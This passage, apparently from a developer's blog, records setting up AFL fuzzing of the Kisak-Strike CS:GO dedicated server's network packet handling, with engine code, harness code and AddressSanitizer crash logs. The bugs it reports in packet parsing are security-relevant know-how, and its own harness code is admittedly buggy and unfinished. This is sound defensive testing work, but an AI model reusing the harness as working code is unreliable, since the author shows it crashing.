	if (i != m_SystemDict.InvalidIndex())
		return m_Systems[m_SystemDict[i]];

	// If it's not an interface we know about, it could be an older
	// version of an interface, or maybe something implemented by
	// one of the instantiated interfaces...

	// QUESTION: What order should we iterate this in?
	// It controls who wins if multiple ones implement the same interface
 	for ( i = 0; i < m_Systems.Count(); ++i )
	{
		void *pInterface = m_Systems[i]->QueryInterface( pSystemName );
		if (pInterface)
			return pInterface;
	}

	int nExternalCount = m_NonAppSystemFactories.Count();
	for ( i = 0; i < nExternalCount; ++i )
	{
		void *pInterface = m_NonAppSystemFactories[i]( pSystemName, NULL );
		if (pInterface)
			return pInterface;
	}

	if ( m_pParentAppSystem )
	{
		void* pInterface = m_pParentAppSystem->FindSystem( pSystemName );
		if ( pInterface )
			return pInterface;
	}

	// No dice..
	return NULL;
}

```
{% endraw %}

We never even initialize the sdlmgr interface in the first place so something is going wrong.

Lets just try recompiling with the -DUSE_SDL=ON flag .

Aaaannnddd that actually worked??? Huh.

Anyway, now we get an ASAN error when we try to run the server. I actually remember this:


{% raw %}
```

#Called Connect on CMaterialSystem:
#We are now here
#poopooshit
#Now reached the end
#Called ShaderFactory with pName == VShaderUtil001
#Module /home/cyberhacker/Netpacketfuzzer/game/bin/linux64/stdshader_dbg failed to load! Error: ((null))
#Module stdshader_dbg failed to load! Error: ((null))
#
#Console initialized.
=================================================================
==1428855==ERROR: AddressSanitizer: global-buffer-overflow on address 0x7fefaddd113d at pc 0x7fefad7d4109 bp 0x7ffe254998d0 sp 0x7ffe254998c0
READ of size 1 at 0x7fefaddd113d thread T0
    #0 0x7fefad7d4108 in UTIL_GetExecutableDir() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_common.cpp:263
    #1 0x7fefad7d436f in UTIL_GetBaseDir() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_common.cpp:289
    #2 0x7fefad7d7561 in CDedicatedAppSystemGroup::Main() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:441
    #3 0x7fefadbab754 in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #4 0x7fefadbab754 in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #5 0x7fefad7a143e in main /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:652
    #6 0x563f7e1e1fa8 in main /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated_main/main.cpp:353
    #7 0x7fefb1879082 in __libc_start_main ../csu/libc-start.c:308
    #8 0x563f7e1e452d in _start (/home/cyberhacker/Netpacketfuzzer/game/srcds_linux+0x1752d)

0x7fefaddd113d is located 3 bytes to the left of global variable 'exedir' defined in '/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_common.cpp:241:14' (0x7fefaddd1140) of size 260
0x7fefaddd113d is located 57 bytes to the right of global variable 'basedir' defined in '/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_common.cpp:282:14' (0x7fefaddd1000) of size 260
SUMMARY: AddressSanitizer: global-buffer-overflow /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_common.cpp:263 in UTIL_GetExecutableDir()
Shadow bytes around the buggy address:
  0x0ffe75bb21d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ffe75bb21e0: 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9
  0x0ffe75bb21f0: 00 00 00 00 00 00 00 00 f9 f9 f9 f9 00 00 00 00
  0x0ffe75bb2200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ffe75bb2210: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0ffe75bb2220: 04 f9 f9 f9 f9 f9 f9[f9]00 00 00 00 00 00 00 00
  0x0ffe75bb2230: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ffe75bb2240: 00 00 00 00 00 00 00 00 04 f9 f9 f9 f9 f9 f9 f9
  0x0ffe75bb2250: 00 00 00 f9 f9 f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9
  0x0ffe75bb2260: 00 f9 f9 f9 f9 f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9
  0x0ffe75bb2270: 00 f9 f9 f9 f9 f9 f9 f9 00 f9 f9 f9 f9 f9 f9 f9
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==1428855==ABORTING



```
{% endraw %}

Here is the code:

{% raw %}
```
const char *UTIL_GetBaseDir( void )
{
	static char	basedir[ MAX_PATH ];

	char const *pOverrideDir = CommandLine()->CheckParm( "-basedir" );
	if ( pOverrideDir )
		return pOverrideDir;

	basedir[ 0 ] = 0;
	const char *pExeDir = UTIL_GetExecutableDir( );
	if ( pExeDir )
	{
		strcpy( basedir, pExeDir );
                int dirlen = strlen( basedir );
                if ( basedir[ dirlen - 3 ] == 'b' &&
                     basedir[ dirlen - 2 ] == 'i' &&
                     basedir[ dirlen - 1 ] == 'n' )
                {
                        basedir[ dirlen - 4 ] = 0;
                }
	}

	return basedir;
}

```
{% endraw %}


So just add -basedir to the command line parameters and we should be fine???

And it worked! Things are going surprisingly well.

After that we get another asan error:


{% raw %}
```

=================================================================
==1428896==ERROR: AddressSanitizer: alloc-dealloc-mismatch (operator new [] vs operator delete) on 0x6020003b0ed0
    #0 0x7f85caf6ec65 in operator delete(void*, unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cc:177
    #1 0x7f85b6edd2af in CUtlVector<char*, CUtlMemory<char*, int> >::PurgeAndDeleteElements() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/tier1/utlvector.h:1391
    #2 0x7f85b6edd2af in InheritKeyValuesRTLMulti /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:4796
    #3 0x7f85b6edcfc2 in InheritKeyValuesRTLMulti /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:4767
    #4 0x7f85b6edcfc2 in InheritKeyValuesRTLMulti /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:4767
    #5 0x7f85b6f31bad in CEconItemDefinition::BInitFromKV(KeyValues*, CEconItemSchema&, CUtlVector<CUtlString, CUtlMemory<CUtlString, int> >*) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:4821
    #6 0x7f85b7d96e8f in CCStrike15ItemDefinition::BInitFromKV(KeyValues*, CEconItemSchema&, CUtlVector<CUtlString, CUtlMemory<CUtlString, int> >*) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/cstrike15/cstrike15_item_schema.cpp:37
    #7 0x7f85b6f91bc8 in CEconItemSchema::BInitItems(KeyValues*, CUtlVector<CUtlString, CUtlMemory<CUtlString, int> >*) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:7522
    #8 0x7f85b6fae822 in CEconItemSchema::BInitSchema(KeyValues*, CUtlVector<CUtlString, CUtlMemory<CUtlString, int> >*) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:6761
    #9 0x7f85b6da9241 in CEconItemSystem::ParseItemSchemaFile(char const*) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/econ/econ_item_system.cpp:242
    #10 0x7f85b7d7c555 in CCSInventoryManager::PostInit() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/cstrike15/cstrike15_item_inventory.cpp:199
    #11 0x7f85b543b16e in InvokeMethod /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/igamesystem.cpp:376
    #12 0x7f85b5201cac in CServerGameDLL::PostInit() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/gameinterface.cpp:943
    #13 0x7f85c3e41fe8 in Host_PostInit() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host.cpp:5029
    #14 0x7f85c3e4ad5b in Host_Init(bool) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host.cpp:5838
    #15 0x7f85c42ca83b in Sys_InitGame(void* (*)(char const*, int*), char const*, void*, int) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll.cpp:1150
    #16 0x7f85c42e5f76 in CEngine::Load(bool, char const*) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_engine.cpp:245
    #17 0x7f85c42ce2af in CModAppSystemGroup::Main() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2381
    #18 0x7f85c50948b4 in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #19 0x7f85c42d75bf in CDedicatedServerAPI::ModInit(ModInfo_t&) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2864
    #20 0x7f85c65d7943 in CDedicatedAppSystemGroup::Main() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:447
    #21 0x7f85c69ab754 in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #22 0x7f85c69ab754 in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #23 0x7f85c65a143e in main /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:652
    #24 0x55afe524ffa8 in main /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated_main/main.cpp:353
    #25 0x7f85ca63d082 in __libc_start_main ../csu/libc-start.c:308
    #26 0x55afe525252d in _start (/home/cyberhacker/Netpacketfuzzer/game/srcds_linux+0x1752d)

0x6020003b0ed0 is located 0 bytes inside of 12-byte region [0x6020003b0ed0,0x6020003b0edc)
allocated by thread T0 here:
    #0 0x7f85caf6d787 in operator new[](unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cc:107
    #1 0x7f85b9c39d40 in AllocString(char const*, int) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/tier1/strtools.cpp:2565
    #2 0x7f85b9c530e6 in V_SplitString2(char const*, char const**, int, CUtlVector<char*, CUtlMemory<char*, int> >&) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/tier1/strtools.cpp:2611
    #3 0x7f85b9c53550 in V_SplitString(char const*, char const*, CUtlVector<char*, CUtlMemory<char*, int> >&) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/tier1/strtools.cpp:2621
    #4 0x7f85b6edcd85 in InheritKeyValuesRTLMulti /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:4741
    #5 0x7f85b6edcfc2 in InheritKeyValuesRTLMulti /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:4767
    #6 0x7f85b6edcfc2 in InheritKeyValuesRTLMulti /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:4767
    #7 0x7f85b6f31bad in CEconItemDefinition::BInitFromKV(KeyValues*, CEconItemSchema&, CUtlVector<CUtlString, CUtlMemory<CUtlString, int> >*) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:4821
    #8 0x7f85b7d96e8f in CCStrike15ItemDefinition::BInitFromKV(KeyValues*, CEconItemSchema&, CUtlVector<CUtlString, CUtlMemory<CUtlString, int> >*) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/cstrike15/cstrike15_item_schema.cpp:37
    #9 0x7f85b6f91bc8 in CEconItemSchema::BInitItems(KeyValues*, CUtlVector<CUtlString, CUtlMemory<CUtlString, int> >*) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:7522
    #10 0x7f85b6fae822 in CEconItemSchema::BInitSchema(KeyValues*, CUtlVector<CUtlString, CUtlMemory<CUtlString, int> >*) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/econ/econ_item_schema.cpp:6761
    #11 0x7f85b6da9241 in CEconItemSystem::ParseItemSchemaFile(char const*) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/econ/econ_item_system.cpp:242
    #12 0x7f85b7d7c555 in CCSInventoryManager::PostInit() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/cstrike15/cstrike15_item_inventory.cpp:199
    #13 0x7f85b543b16e in InvokeMethod /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/igamesystem.cpp:376
    #14 0x7f85b5201cac in CServerGameDLL::PostInit() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/gameinterface.cpp:943
    #15 0x7f85c3e41fe8 in Host_PostInit() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host.cpp:5029
    #16 0x7f85c3e4ad5b in Host_Init(bool) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host.cpp:5838
    #17 0x7f85c42ca83b in Sys_InitGame(void* (*)(char const*, int*), char const*, void*, int) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll.cpp:1150
    #18 0x7f85c42e5f76 in CEngine::Load(bool, char const*) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_engine.cpp:245
    #19 0x7f85c42ce2af in CModAppSystemGroup::Main() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2381
    #20 0x7f85c50948b4 in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #21 0x7f85c42d75bf in CDedicatedServerAPI::ModInit(ModInfo_t&) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2864
    #22 0x7f85c65d7943 in CDedicatedAppSystemGroup::Main() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:447
    #23 0x7f85c69ab754 in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #24 0x7f85c69ab754 in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #25 0x7f85c65a143e in main /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:652
    #26 0x55afe524ffa8 in main /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated_main/main.cpp:353
    #27 0x7f85ca63d082 in __libc_start_main ../csu/libc-start.c:308

SUMMARY: AddressSanitizer: alloc-dealloc-mismatch ../../../../src/libsanitizer/asan/asan_new_delete.cc:177 in operator delete(void*, unsigned long)
==1428896==HINT: if you don't care about these errors you may set ASAN_OPTIONS=alloc_dealloc_mismatch=0
==1428896==ABORTING


```
{% endraw %}

So just do `export ASAN_OPTIONS=alloc_dealloc_mismatch=0` ?

Ok so now the server is running. Now we need to connect to it and see if the fuzzing code works.

After trying to connect to the server we get a segfault (very surprising. /s) .

Lets investigate the crash in a debugger.


Aaanndd the crash seems to happen in the longjmp thing in net_ws.cpp . So the jump back to the main function is not working properly. I think that we should first make a minimal example and then try to scale things up to the csgo binary.


Lets try this as the main binary:

{% raw %}
```


#include "jump.h"
#include <setjmp.h>
#include <stdio.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>

typedef void (*lib_func)();

void jump_thing(void) {

	void* handle = NULL;
	lib_func func    = NULL;
	// Load the library and call the function inside it:

	handle = dlopen("stuff.so", RTLD_NOW | RTLD_GLOBAL);

	if (handle == NULL)
   {
       fprintf(stderr, "Unable to open lib: %s\n", dlerror());
       return;
   }

	func = dlsym(handle, "jump_bullshit");

	func();

	return;


}



int main (int argc, char** argv) {

	int shit;

	shit = setjmp(env_buffer);

	if ( shit != 0) {

		printf("Returned succesfully from library.!\n");

		exit(0);
	}

	// do the jump

	jump_thing();


	// we shouldn't reach this part of the code

	printf("Something went wrong!\n");

	exit(0);

}



```
{% endraw %}


and then jump.h :

{% raw %}
```

#include <setjmp.h>

jmp_buf env_buffer;


```
{% endraw %}

to compile this just do:

{% raw %}
```
gcc main.c -ldl -o main
```
{% endraw %}

then we need to program the "library" :


{% raw %}
```



#include "jump.h"
#include <setjmp.h>
#include <stdio.h>


void jump_bullshit(void) {

	// longjmp(env_buffer, netchan);

	longjmp(env_buffer, 2);

	// This part should not be reached!
	
	printf("Something went wrong in jump_bullshit!\n");
	return;

}

```
{% endraw %}

and this code now reproduces the issue which we had previously. That is quite bad since I do not know how to do this properly. Now a way in which we can go about this is to use the deferred forkserver method. The deferred forkserver allows us to have the __AFL_LOOP inside a shared library. We need to put the __AFL_HAVE_MANUAL_CONTROL thing or whatever with it to use it.

Instead of doing some longjmp bullshit lets just add this to net_ws.cpp :

{% raw %}
```
#define MAX_INPUT_SIZE	10000


netpacket_t* get_new_packet(netpacket_t inpacket) {

	unsigned char packet_buffer[MAX_INPUT_SIZE];


	

	inpacket.from.Clear();
	inpacket.received = 0.0f; // hardcoded receive time
	inpacket.source = 100; // hardcoded source socket	



	// Get the packet buffer from stdin because reasons.
	read(STDIN_FILENO, packet_buffer, MAX_INPUT_SIZE);

	//inpacket.data = scratch;

	inpacket.data = packet_buffer;

	inpacket.size = 0;
	inpacket.wiresize = 0;
	inpacket.pNext = NULL;
	inpacket.message.SetDebugName("inpacket.message");

	inpacket.message.StartReading( inpacket.data, inpacket.size );

	return &inpacket;




}


void fuzz_main_loop(CNetChan* netchan) {
	netpacket_t* packet;
	// here we add the fuzzing code:
	
	#ifdef __AFL_HAVE_MANUAL_CONTROL
  	__AFL_INIT();
	#endif


  	while (__AFL_LOOP(1000)) {


  		get_new_packet(*packet);

  		netchan->ProcessPacket(packet, true);


  	}

  	return;



}

```
{% endraw %}
and then add this line:

{% raw %}
```
		if ( netchan )
		{
			// MODIFIED THING:
			// Just call back to the main function from here and pass this object as a parameter.
			//longjmp(env_buffer, netchan);

			fuzz_main_loop(netchan);

			netchan->ProcessPacket( packet, true );
		}

```
{% endraw %}


After fixing a couple of typos, we now get another crash:

{% raw %}
```
0x00007ffff15c48e4 in CBitRead::Seek (this=0x7fffffff7638, nPosition=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/tier1/newbitbuf.cpp:396
396				m_nInBufWord = *( pPartial++ );
(gdb) x/10i $rip
=> 0x7ffff15c48e4 <CBitRead::Seek(int)+692>:	movzx  r15d,BYTE PTR [r13+0x0]
   0x7ffff15c48e9 <CBitRead::Seek(int)+697>:	mov    rdi,r10
   0x7ffff15c48ec <CBitRead::Seek(int)+700>:	shr    rdi,0x3
   0x7ffff15c48f0 <CBitRead::Seek(int)+704>:	movzx  r11d,BYTE PTR [rdi+0x7fff8000]
   0x7ffff15c48f8 <CBitRead::Seek(int)+712>:	test   r11b,r11b
   0x7ffff15c48fb <CBitRead::Seek(int)+715>:	je     0x7ffff15c4907 <CBitRead::Seek(int)+727>
   0x7ffff15c48fd <CBitRead::Seek(int)+717>:	cmp    r11b,0x3
   0x7ffff15c4901 <CBitRead::Seek(int)+721>:	jle    0x7ffff15c556a <CBitRead::Seek(int)+3898>
   0x7ffff15c4907 <CBitRead::Seek(int)+727>:	and    esi,0x2
   0x7ffff15c490a <CBitRead::Seek(int)+730>:	mov    DWORD PTR [rbx+0x18],r15d
(gdb) i r


```
{% endraw %}

This is because something goes wrong in the Seek thing.




-------------------------------------------------------------------------


I think that it crashes in the bitbuffer Seek function because we are passing the buffer in a wrong way. Let's just try it with the normal handler and lets just log the packets instead.

Luckily for us there is a NET_LogBadPacket function which just logs (as the name implies) bad packets to a file. Lets just make a copy of that function and rename it to NET_LogPacket .

{% raw %}
```


void NET_LogPacket(netpacket_t * packet)
{
	FileHandle_t fp;
	int i = 0;
	char filename[ MAX_OSPATH ];
	bool done = false;

	while ( i < 1000 && !done )
	{
		Q_snprintf( filename, sizeof( filename ), "packet%03i.dat", i );
		fp = g_pFileSystem->Open( filename, "rb" );
		if ( !fp )
		{
			fp = g_pFileSystem->Open( filename, "wb" );
			g_pFileSystem->Write( packet->data, packet->size, fp );
			done = true;
		}
		if ( fp )
		{
			g_pFileSystem->Close( fp );
		}
		i++;
	}

	if ( i < 1000 )
	{
		Msg( "Packet buffer for %s written to %s\n", ns_address_render( packet->from ).String(), filename );
	}
	else
	{
		Msg( "Couldn't write packet buffer, delete packet###.dat files to make space\n" );
	}
}

```
{% endraw %}

our code is now this:

{% raw %}
```
		CNetChan * netchan = NET_FindNetChannel( sock, packet->from );

		if ( netchan )
		{
			// MODIFIED THING:
			// Just call back to the main function from here and pass this object as a parameter.
			//longjmp(env_buffer, netchan);

			//fuzz_main_loop(netchan);

			// Log packet here:

			NET_LogPacket(packet);

			// Process packet

			netchan->ProcessPacket( packet, true );
		}
		/* else	// Not an error that may happen during connect or disconnect
		{
			Msg ("Sequenced packet without connection from %s\n" , ns_address_render( packet->from ).String() );
		}*/
	}
```
{% endraw %}

recompile and run.


When running normally we get an asan error:

{% raw %}
```
=================================================================
==6736==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffff9a90 at pc 0x7fffefc4e3f6 bp 0x7fffffff99c0 sp 0x7fffffff99b0
READ of size 4 at 0x7fffffff9a90 thread T0
    #0 0x7fffefc4e3f5 in CFixedBitVecBase<512>::FindNextSetBit(int) const /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/bitvec.h:1261
    #1 0x7fffefc4e3f5 in CBaseClient::CLCMsg_ListenEvents(CCLCMsg_ListenEvents const&) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/baseclient.cpp:1302
    #2 0x7ffff062ac61 in CNetChan::_ProcessMessages(bf_read&, bool) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/net_chan.cpp:2403
    #3 0x7ffff062d6fe in CNetChan::ProcessMessages(bf_read&, bool) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/net_chan.cpp:2309
    #4 0x7ffff063b909 in CNetChan::CheckReceivingList(int) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/net_chan.cpp:2594
    #5 0x7ffff0654000 in CNetChan::ProcessPacket(netpacket_s*, bool) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/net_chan.cpp:2928
    #6 0x7ffff06ec9c6 in NET_ProcessSocket(int, IConnectionlessPacketHandler*) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/net_ws.cpp:2174
    #7 0x7fffefee5735 in CBaseServer::RunFrame() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/baseserver.cpp:3267
    #8 0x7fffefd0b4e9 in SV_Frame(bool) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sv_main.cpp:3455
    #9 0x7ffff05322fa in _Host_RunFrame_Server(bool) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host.cpp:3318
    #10 0x7ffff053bde4 in _Host_RunFrame(float) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host.cpp:4262
    #11 0x7ffff0545127 in Host_RunFrame(float) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host.cpp:4684
    #12 0x7ffff059fc2f in CHostState::State_Run(float) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host_state.cpp:611
    #13 0x7ffff05a2ccd in CHostState::FrameUpdate(float) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host_state.cpp:805
    #14 0x7ffff09eca29 in CEngine::Frame() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_engine.cpp:572
    #15 0x7ffff09ce1ef in CDedicatedServerAPI::RunFrame() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2900
    #16 0x7ffff2cd6c57 in RunServerIteration(bool) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:215
    #17 0x7ffff2cd7003 in RunServer(bool) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:275
    #18 0x7ffff2cd23be in CDedicatedExports::RunServer() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_common.cpp:198
    #19 0x7ffff09ce6c3 in CModAppSystemGroup::Main() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2399
    #20 0x7ffff1794b34 in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #21 0x7ffff09d774f in CDedicatedServerAPI::ModInit(ModInfo_t&) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2864
    #22 0x7ffff2cd7943 in CDedicatedAppSystemGroup::Main() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:447
    #23 0x7ffff30ab754 in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #24 0x7ffff30ab754 in CAppSystemGroup::Run() /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #25 0x7ffff2ca143e in main /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:652
    #26 0x555555568af6 in main /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated_main/main.cpp:354
    #27 0x7ffff6d44082 in __libc_start_main ../csu/libc-start.c:308
    #28 0x55555556a94d in _start (/home/cyberhacker/Netpacketfuzzer/game/srcds_linux+0x1694d)

Address 0x7fffffff9a90 is located in stack of thread T0 at offset 96 in frame
    #0 0x7fffefc4b80f in CBaseClient::CLCMsg_ListenEvents(CCLCMsg_ListenEvents const&) /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/baseclient.cpp:1268

  This frame has 1 object(s):
    [32, 96) 'EventArray' (line 1272) <== Memory access at offset 96 overflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/public/bitvec.h:1261 in CFixedBitVecBase<512>::FindNextSetBit(int) const
Shadow bytes around the buggy address:
  0x10007fff7300: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff7310: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff7320: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff7330: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff7340: 00 00 00 00 00 00 f1 f1 f1 f1 00 00 00 00 00 00
=>0x10007fff7350: 00 00[f3]f3 f3 f3 00 00 00 00 00 00 00 00 00 00
  0x10007fff7360: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff7370: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff7380: 00 00 00 00 00 00 f1 f1 f1 f1 00 f3 f3 f3 00 00
  0x10007fff7390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff73a0: 00 00 00 00 f1 f1 f1 f1 f1 f1 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==6736==ABORTING
[Thread 0x7fffceb20700 (LWP 6971) exited]
[Thread 0x7fffcec5a700 (LWP 6970) exited]
[Thread 0x7fffcef15700 (LWP 6951) exited]
[Thread 0x7fffcf322700 (LWP 6950) exited]
[Thread 0x7fffcf1ee700 (LWP 6867) exited]
[Thread 0x7fffcfd0e700 (LWP 6844) exited]
[Thread 0x7fffd05f4700 (LWP 6843) exited]
[Thread 0x7fffd626d700 (LWP 6748) exited]
[Thread 0x7fffe9965700 (LWP 6745) exited]
[Thread 0x7fffe9aa9700 (LWP 6744) exited]
[Thread 0x7ffff2c4c700 (LWP 6740) exited]
[Thread 0x7ffff6d11840 (LWP 6736) exited]
[Inferior 1 (process 6736) exited with code 01]


```
{% endraw %}

I think that I am just going to do a `__attribute__((no_sanitize("address")))`

Also there is an asan.sh script in the output and its contents are this:

{% raw %}
```
export ASAN_OPTIONS=halt_on_error=0:handle_abort=1:exitcode=0:verbosity=0:detect_leaks=1:detect_odr_violation=0:alloc_dealloc_mismatch=0
